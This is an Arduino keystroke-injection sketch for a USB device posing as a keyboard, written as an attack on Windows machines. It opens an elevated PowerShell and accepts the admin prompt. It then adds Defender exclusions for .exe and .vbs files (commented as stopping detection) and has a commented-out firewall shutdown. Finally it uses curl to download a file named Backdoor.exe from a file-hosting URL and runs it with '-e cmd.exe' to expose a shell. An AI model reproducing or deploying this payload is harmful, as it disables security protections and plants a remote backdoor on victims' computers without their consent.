#include <Keyboard.h>

// Utility function
void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{
  delay(20000);
  
  // Start Keyboard and Mouse
  Keyboard.begin();

//stope exe from being detected
delay(1000);
Keyboard.press(KEY_LEFT_GUI);
Keyboard.press(114);
Keyboard.releaseAll();
delay(200);
Keyboard.print("powershell Start-Process powershell -Verb runAs");
typeKey(KEY_RETURN);
delay(6000);


Keyboard.press(KEY_LEFT_ALT);
Keyboard.press(121);
Keyboard.releaseAll();
delay(4000);


Keyboard.print("Set-MpPreference -ExclusionExtension exe");
typeKey(KEY_RETURN);
delay(200);

Keyboard.print("Set-MpPreference -ExclusionExtension vbs");
typeKey(KEY_RETURN);
delay(200);

//  Keyboard.print("netsh advfirewall set allprofiles state off");
//  typeKey(KEY_RETURN);
//  delay(500);
Keyboard.print("exit");
typeKey(KEY_RETURN);
delay(30);


  // Start Payload
  delay(400);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(400);

  Keyboard.print("cmd");

  typeKey(KEY_RETURN);

  delay(1000);
  
  Keyboard.print("mkdir win");
  typeKey(KEY_RETURN);
  delay(500);
  Keyboard.print("curl.exe --output b.exe --url https://cdn-34.anonfiles.com/pavdocz0pe/7ef9a746-1608039022/Backdoor.exe");
  typeKey(KEY_RETURN);
  delay(500);
  //Keyboard.print("powershell -ExecutionPolicy ByPass -File b.ps1");
  //typeKey(KEY_RETURN);
  //delay(500);


  

  typeKey(KEY_RETURN);

  delay(50);

  Keyboard.print("START b.exe -e cmd.exe -d"); //& exit");

  typeKey(KEY_RETURN);

  Keyboard.print("exit");

  typeKey(KEY_RETURN);

  // End Payload

  // Stop Keyboard and Mouse
  Keyboard.end();
}

// Unused
void loop() {}
